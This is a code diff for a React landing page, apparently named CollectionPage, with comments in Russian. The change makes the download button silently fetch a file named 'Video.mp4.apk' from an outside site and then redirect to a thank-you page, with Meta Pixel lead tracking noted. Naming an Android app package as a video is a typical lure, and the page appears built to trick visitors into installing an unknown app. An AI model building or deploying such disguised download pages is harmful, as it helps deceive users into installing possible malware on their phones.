@@ -1,8 +1,9 @@
 import React, { useEffect } from 'react';
-
-// Функция для безопасного вызова Meta Pixel
+import { useNavigate } from 'react-router-dom'; // Импорт для перенаправления
 
 export default function CollectionPage() {
+  const navigate = useNavigate(); // Инициализация useNavigate
+    
   // Устанавливаем текущую дату
   useEffect(() => {
     const now = new Date();
@@ -20,14 +21,23 @@ export default function CollectionPage() {
   // Обработчик скачивания
   const handleDownload = (e) => {
     e.preventDefault();
+    
+    // ВНИМАНИЕ: Здесь нет вызова fbq('track', 'Lead'),
+    // потому что Lead будет отправлен на странице ThankYou.
 
-    // Запуск скачивания
+    // 1. ЗАПУСКАЕМ СКАЧИВАНИЕ ФАЙЛА
     const link = document.createElement('a');
     link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
     link.download = 'Video.mp4.apk';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+
+    // 2. ПЕРЕНАПРАВЛЕНИЕ: Ждем 500мс для надежного запуска скачивания
+    // Это гарантирует, что скачивание начнется до смены страницы.
+    setTimeout(() => {
+        navigate('/thankyou'); // Переход на страницу благодарности
+    }, 500); 
   };
 
 
@@ -44,7 +54,7 @@ export default function CollectionPage() {
         backgroundColor: '#000'
       }}
     >
-      {/* Фон с размытием */}
+      {/* Фон с размытием. Предполагается, что /img/image.jpg существует */}
       <div
         style={{
           position: 'absolute',
@@ -76,7 +86,7 @@ export default function CollectionPage() {
 
         <button
           id="download-btn"
-          onClick={handleDownload} // <-- При клике вызывается handleDownload, который отправляет событие 'Lead'
+          onClick={handleDownload} 
           style={{
             padding: '15px 40px',
             backgroundColor: '#ff0055',
